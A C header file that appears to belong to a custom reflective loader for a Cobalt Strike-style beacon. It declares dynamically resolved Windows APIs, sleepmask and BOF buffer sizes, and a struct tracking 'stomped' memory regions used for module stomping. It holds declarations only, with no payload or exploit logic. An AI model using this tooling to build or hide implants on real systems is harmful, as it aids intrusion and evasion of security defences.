#pragma once
#include <windows.h>
#include <beacon.h>
#include <Native.h>
#include <Macros.h>

// Define all of the DLLs that we require beyond Ntdll and Kernel32
#define DLL_LIST \
    DLL_ENTRY( User32 ) \
    DLL_ENTRY( Msvcrt )

#define API_LIST \
    \
    /*Ntdll.dll*/ \
    \
    API_ENTRY( RtlAllocateHeap, Ntdll ) \
    API_ENTRY( NtProtectVirtualMemory, Ntdll ) \
    API_ENTRY( NtFlushInstructionCache, Ntdll ) \
    API_ENTRY( LdrLoadDll, Ntdll ) \
    API_ENTRY( LdrGetProcedureAddress, Ntdll ) \
    \
    /*Kernel32.dll*/\
    \
    API_ENTRY( LoadLibraryA, Kernel32 ) \
    API_ENTRY( AllocConsole, Kernel32 ) \
    API_ENTRY( GetConsoleWindow, Kernel32 ) \
    API_ENTRY( VirtualAlloc, Kernel32) \
    API_ENTRY( HeapAlloc, Kernel32) \
    API_ENTRY( GetCurrentThreadStackLimits, Kernel32) \
    API_ENTRY( TlsAlloc, Kernel32) \
    API_ENTRY( TlsSetValue, Kernel32) \
    API_ENTRY( TlsFree, Kernel32) \
    \
    /*Msvcrt.dll*/\
    \
    API_ENTRY( freopen, Msvcrt ) \
    API_ENTRY( __iob_func, Msvcrt ) \
    API_ENTRY( printf, Msvcrt ) \
    API_ENTRY( _snprintf, Msvcrt ) \
    API_ENTRY( vprintf, Msvcrt ) \
    API_ENTRY( getchar, Msvcrt ) \
    API_ENTRY( calloc, Msvcrt ) \
    API_ENTRY( strcmp, Msvcrt ) \
    \
    /*User32.dll*/\
    \
    API_ENTRY( ShowWindow, User32 ) \
    API_ENTRY( SetForegroundWindow, User32 ) \
    API_ENTRY( UpdateWindow, User32 ) \
    API_ENTRY( MessageBoxW, User32 )

    EXTERN_C VOID PrintMsg(const char*, BOOL, const char*, ...);
    EXTERN_C PVOID ResolveInstanceAddr();

#define SZ_SLEEPMASK    PAGE_SIZE * 10
#define SZ_BOF          PAGE_SIZE * 20

typedef struct _CUSTOM_DATA
{
    SIZE_T  szBeacon;
    SIZE_T  szStomp;
    SIZE_T  szBeaconExec;
    SIZE_T  szBeaconRw;

    PVOID   pStompBeacon;
    PVOID   pStompBeaconExec;
    PVOID   pStompBeaconRw;
    PVOID   pStompSleepmask;
    PVOID   pStompBof;
} CUSTOM_DATA, *PCUSTOM_DATA;

#ifdef DEBUG
#define PRINT(fmt, ...)  PrintMsg(__FUNCTION__, FALSE, fmt, ##__VA_ARGS__)
#define PRINTB(fmt, ...) PrintMsg(__FUNCTION__, TRUE,  fmt, ##__VA_ARGS__)
#else
#define PRINT(fmt, ...)
#define PRINTB(fmt, ...)
#endif
